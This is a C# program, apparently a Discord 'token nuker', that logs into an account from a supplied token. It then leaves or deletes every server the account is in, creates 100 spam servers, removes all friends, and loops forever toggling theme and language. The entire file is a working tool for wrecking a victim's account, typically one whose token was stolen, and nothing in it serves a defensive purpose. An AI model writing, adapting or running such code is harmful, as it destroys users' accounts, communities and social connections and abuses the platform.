using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Discord;
using Discord.Gateway;

namespace Token_Fucker
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("Enter a token to be fucked.");
            string token = Console.ReadLine();
            DiscordSocketClient client = new DiscordSocketClient(new DiscordSocketConfig() { ApiVersion = 7 });
            client.OnLoggedIn += Client_OnLoggedIn;
            try
            {
                client.Login(token);
            } catch (Discord.InvalidTokenException)
            {
                Console.WriteLine("Invalid token passed.");
            }
            Thread.Sleep(-1);
        }
        private static void Client_OnLoggedIn(DiscordSocketClient client, LoginEventArgs args)
        {
            Console.WriteLine("Started client, nuking.");

            // Leave/delete every guild.
            var guilds = client.GetGuilds();
            foreach (var guildids in guilds)
            {
                try
                {
                    client.LeaveGuild(guildids.Id);
                    Console.WriteLine("Left Guild " + guildids.Id);
                }
                catch
                {
                    client.DeleteGuild(guildids.Id);
                    Console.WriteLine("Deleted Guild " + guildids.Id);
                }
            }

            // Mass Create Guilds
            for (int amount = 0; amount < 100; amount++)
            {
                client.CreateGuild("Anarchy", null, "europe");
                Console.WriteLine("Created a guild.");
            }

            // Remove all friends.
            var friends = client.GetRelationships();
            foreach (var friendids in friends)
            {
                client.RemoveRelationship(friendids.User.Id);
                Console.WriteLine("Removed relationship with ID " + friendids.User.Id);
            }

            // Spam switch through dark and white mode, and rapidly change the language of the user's account.
            Console.WriteLine("Rapidly changing through dark and white mode, and random languages.");
            while (true)
            {
                try
                {
                    var values = Enum.GetValues(typeof(DiscordLanguage)).Cast<DiscordLanguage>();
                    foreach(var value in values)
                    {
                        client.User.ChangeSettings(new UserSettingsProperties
                        {
                            Theme = DiscordTheme.Dark,
                            Language = value
                        });
                        client.User.ChangeSettings(new UserSettingsProperties
                        {
                            Theme = DiscordTheme.Light,
                            Language = value
                        });
                    }
                } catch (Exception ex)
                {
                    Console.WriteLine("Error: " + ex);
                }
            }
        }
    }
}
